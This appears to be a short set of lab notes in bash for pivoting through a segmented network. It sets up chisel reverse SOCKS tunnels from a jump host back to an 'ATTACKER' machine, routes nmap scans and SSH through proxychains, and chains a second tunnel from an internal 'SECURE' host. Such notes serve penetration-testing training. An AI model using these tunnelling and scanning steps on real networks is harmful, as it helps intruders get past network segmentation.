```bash
# Connect to ATTACKER (172.16.5.2) via SSH.
ssh root@172.16.5.2

# From there connect to JUMP (172.16.5.3) via SSH.
ssh root@172.16.5.3

# On ATTACKER (listen for reverse connections)
chisel server -p 8000 --reverse

# On JUMP (connect out to attacker; create SOCKS on the SERVER side = ATTACKER)
chisel client 172.16.5.2:8000 R:50001:socks

# Modify /etc/proxychains4.conf, add 'socks5 127.0.0.1 50001' as only proxy

# Test the proxy
proxychains nmap -sT -Pn 192.168.80.30

# SSH to Secure via the Jump SOCKS
proxychains ssh root@192.168.80.30

# On SECURE (once logged in):
chisel server --socks5 -p 8001

# On ATTACKER
chisel client --proxy socks://127.0.0.1:50001 192.168.80.30:8001 50002:socks

# Modify /etc/proxychains4.conf, add 'socks5 127.0.0.1 50002' as only proxy

# Test the new proxy
proxychains curl http://localhost
```